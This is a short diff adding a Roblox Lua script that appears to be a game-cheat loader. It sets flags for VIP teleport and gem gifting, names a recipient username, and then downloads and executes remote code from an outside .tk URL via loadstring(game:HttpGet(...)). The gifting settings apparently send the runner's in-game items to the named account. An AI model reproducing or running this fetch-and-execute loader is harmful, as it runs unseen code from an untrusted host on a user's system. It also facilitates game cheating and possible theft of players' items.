@@ -1,0 +1,5 @@
+_G.TeleportVIP = true
+_G.GiftGem = true
+_G.NameGift = "ndhn0903"
+_G.Flag = true
+loadstring(game:HttpGet("https://www.hngaming.tk/hnpet.txt"))()
